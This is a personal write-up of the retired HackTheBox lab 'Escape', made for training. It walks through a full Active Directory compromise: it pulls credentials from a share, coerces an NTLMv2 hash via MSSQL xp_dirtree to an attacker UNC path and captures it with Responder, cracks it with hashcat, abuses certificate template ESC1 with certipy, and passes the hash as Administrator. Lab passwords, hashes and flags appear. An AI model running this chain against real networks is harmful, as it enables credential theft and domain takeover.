# ESCAPE - Medium

**Date Started:** June 11, 2026
**Date Completed:** June 11, 2026
**Difficulty:** Medium
**Platform:** HackTheBox (retired)
**Tags:** Active Directory, MSSQL, NTLMv2 Coercion, Responder, ADCS ESC1
**Status:** COMPLETE

---

## Summary / Attack Chain

Second ADCS box — simpler cert abuse than Certified (ESC1 vs ESC9) but introduces MSSQL hash coercion and credential hunting in logs. Three credential pivots, each from a completely different source: a PDF, a captured hash, and an error log.

```
SMB guest access → Public share → PDF with MSSQL creds (PublicUser)
  → MSSQL xp_dirtree → Responder captures sql_svc NTLMv2 → hashcat -m 5600
    → WinRM as sql_svc → ERRORLOG.BAK → ryan.cooper password (typed as username)
      → certipy find → ESC1 (UserAuthentication template) → cert as Administrator
        → certipy auth → Administrator NT hash → PtH → DA
```

**New techniques vs Certified:** MSSQL hash coercion (xp_dirtree + Responder), NTLMv2 cracking (mode 5600 — must crack, can't PtH), credential hunting in application logs, ADCS ESC1 (ENROLLEE_SUPPLIES_SUBJECT — simpler than ESC9, no UPN swap needed).

---

## Phase 1 — Enumeration

```bash
nmap -p- -Pn --min-rate 1000 -T4 <TARGET> -oN escape_all_ports.txt
nmap -p 53,88,135,139,389,445,636,1433,3268,3269,5985 -Pn -sC -sV <TARGET> -oN escape_services.txt
```

**Findings / reads:**
- **DC fingerprint** (53/88/389/636/3268/3269/445) — Domain Controller.
- **Domain: `sequel.htb`**, Host: `DC`, FQDN `dc.sequel.htb`.
- **Port 1433 (MSSQL)** — unusual on a DC. First thread to pull.
- **Port 5985 (WinRM)** — open, evil-winrm available with valid creds.
- **ADCS** — TLS certificate metadata leaks CA name `sequel-DC-CA`.

```bash
echo "<TARGET> sequel.htb dc.sequel.htb DC" | sudo tee -a /etc/hosts
```

---

## Phase 2 — SMB Guest Access → MSSQL Creds

```bash
smbclient //<TARGET>/Public -N -c 'recurse ON; prompt OFF; mget *'
```

Guest/null auth allowed on the `Public` share. Contains `SQL Server Procedures.pdf`.

```bash
strings SQL\ Server\ Procedures.pdf
```

**`PublicUser : GuestUserCantWrite1`** — MSSQL credentials found in the PDF.

---

## Phase 3 — MSSQL Hash Coercion → sql_svc

### Connect to MSSQL
```bash
mssqlclient.py sequel.htb/PublicUser:'GuestUserCantWrite1'@<TARGET>
```

PublicUser has minimal privileges — no `xp_cmdshell`, no useful data in the database. Dead end for direct exploitation.

### Coerce authentication with xp_dirtree
`xp_dirtree` lists directory contents. When pointed at a UNC path, the SQL service account authenticates outbound over SMB — sending its NTLMv2 hash to whatever is listening.

**Start Responder first** (separate terminal):
```bash
sudo python3 /opt/Responder/Responder.py -I tun0
```

**Then in the MSSQL session:**
```sql
EXEC xp_dirtree '\\YOUR_IP\share', 1, 1
```

Responder captures the NTLMv2 hash for `sql_svc`.

> **Firewall note:** opsbox UFW was blocking inbound connections on tun0. Fix: `sudo ufw allow in on tun0 to any` — allows all inbound on the VPN interface only, public interface stays locked down.

### Crack the hash
```bash
scp opsbox:/opt/Responder/logs/SMB-NTLMv2-SSP-<TARGET>.txt ~/
hashcat -m 5600 ~/escape_sql_svc.hash ~/wordlists/rockyou.txt
```

**`sql_svc : REGGIE1234ronnie`**

> **Lesson:** Net-NTLMv2 (mode 5600) is a challenge/response — you **must** crack it to plaintext. You cannot pass-the-hash with it. Only regular NT hashes (mode 1000) support PtH. Copy the hash from Responder's log file, not from screen — copy-paste truncation causes false "exhausted" results.

> **Lesson:** The recognition pattern for MSSQL coercion: low-privilege SQL access + no xp_cmdshell + no useful data = try xp_dirtree coercion. It's the standard move when you hit a dead end on a SQL box.

---

## Phase 4 — WinRM → Credential Hunting → ryan.cooper

```bash
evil-winrm -i <TARGET> -u sql_svc -p 'REGGIE1234ronnie'
```

### Enumerate logs
```powershell
dir C:\SQLServer\Logs\
type C:\SQLServer\Logs\ERRORLOG.BAK
```

**Finding:** A failed login attempt where ryan.cooper typed his password into the username field:
```
Login failed for user 'NuclearMosquito3'
```

**`ryan.cooper : NuclearMosquito3`** — validated via evil-winrm.

```bash
evil-winrm -i <TARGET> -u ryan.cooper -p 'NuclearMosquito3'
```
```
*Evil-WinRM* PS> type C:\Users\Ryan.Cooper\Desktop\user.txt
```

> **Lesson:** After every new shell, check logs, config files, scripts, history, and registry for leaked credentials. This isn't a "technique" — it's a habit. The cred was in a SQL error log because a user fat-fingered their password into the username field. Thoroughness, not cleverness.

---

## Phase 5 — ADCS ESC1 → Administrator

### Enumerate vulnerable templates
```bash
certipy find -vulnerable -u ryan.cooper -p 'NuclearMosquito3' -dc-ip <TARGET>
```

**Vulnerable template found:** `UserAuthentication` — ESC1.

### ESC1 conditions (all five met)

| Condition | Value |
|-----------|-------|
| ENROLLEE_SUPPLIES_SUBJECT | Enabled — requester chooses the SAN |
| Client Authentication EKU | Present — cert can be used for login |
| Domain Users can enroll | Yes — no special group needed |
| Manager approval | Not required |
| Authorized signatures | 0 |

### ESC1 vs ESC9
On Certified (ESC9), the template didn't let you choose the subject — you had to change the account's UPN to Administrator, request the cert, then revert the UPN. Three steps.

ESC1 is simpler: the template has a field that says "who is this cert for?" and you just type "Administrator." One step.

### Request certificate as Administrator
```bash
certipy req -u ryan.cooper -p 'NuclearMosquito3' -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dc-ip <TARGET> -target dc.sequel.htb
```

**Result:** `administrator.pfx` saved.

### Authenticate with the certificate
```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET>
```

**Result:** `Administrator hash: a52f78e4c751e5f5e17e1e9f3e58f4ee`

---

## Phase 6 — Pass-the-Hash → DA

```bash
evil-winrm -i <TARGET> -u administrator -H a52f78e4c751e5f5e17e1e9f3e58f4ee
```
```
*Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
```

> **Recurring mistake:** `-H` takes only the 32-char NT hash (second half after the colon), not the full `LM:NT` format. Third time making this error — drill it.

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `d21e0450e9bf371558aa3a0f9862f63a` |
| root.txt | `e906f8924e3f35f166bf40b1a33f81fc` |

*(HTB flags rotate per spawn — these are instance-specific.)*

---

## Mistakes During Blind Attempt

1. **UFW blocking inbound on tun0** — spent significant time debugging why Responder wasn't catching hashes. opsbox firewall had INPUT policy DROP with only port 22 allowed. Fix: `sudo ufw allow in on tun0 to any`. Infrastructure issue, not technique error — but on the exam, this would eat clock time.
2. **Hash copy-paste truncation** — copied NTLMv2 hash from Responder screen output, hashcat exhausted instantly. Used Responder's log file instead. Same issue as Sauna — use log files or `-outputfile`, never copy from screen.
3. **Wrong hash for evil-winrm (again)** — used LM hash instead of NT hash for `-H` flag. Third time making this mistake across three boxes. The NT hash is the second half, after the colon.
4. **certipy version conflict** — aioquic install from Responder setup broke cryptography library. Had to downgrade certipy from 5.0.4 to 4.8.2 to resolve. Infrastructure issue.
5. **/etc/hosts not set** — forgot to add sequel.htb to hosts file before starting. Caused MSSQL connection issues initially.

No decision-making errors — every technique choice was correct. All mistakes were infrastructure/mechanical.

---

## Lessons / Exam Relevance

- **MSSQL on a DC is the signal** — port 1433 on a domain controller is unusual and should be your first thread. Low-priv SQL access + no xp_cmdshell = try xp_dirtree coercion.
- **NTLMv2 vs NT hash** — mode 5600 (NTLMv2, captured over wire) must be cracked to plaintext. Mode 1000 (NT hash, dumped from memory/disk) can be used for PtH. Know which is which.
- **Responder is a listener, not a scanner** — you make the target connect to you. Start Responder first, then trigger the outbound auth from the target. The direction matters.
- **Credential hunting is a habit, not a technique** — check logs, configs, scripts, history, and registry after every new shell. The ryan.cooper password was a fat-fingered login in an error log. No tool finds this — thoroughness does.
- **ESC1 is simpler than ESC9** — ENROLLEE_SUPPLIES_SUBJECT means you specify the impersonation target right in the certificate request. No UPN swapping, no reverting, no multi-step dance. One command.
- **Infrastructure prep matters** — firewall rules, /etc/hosts, clock skew, tool version conflicts all ate time. On exam day: set up opsbox (hosts, ufw, clock sync, tool versions) before touching the target.
- **Always use log files for hashes** — Responder saves to `/opt/Responder/logs/`. hashcat's `-outputfile`. GetNPUsers' `-outputfile`. Screen copy-paste truncates and wastes time.

## Cleanup / Changes Made

- No AD modifications made (ESC1 only requests a certificate, no account changes).
- Responder captured sql_svc NTLMv2 hash (passive capture, no target modification).
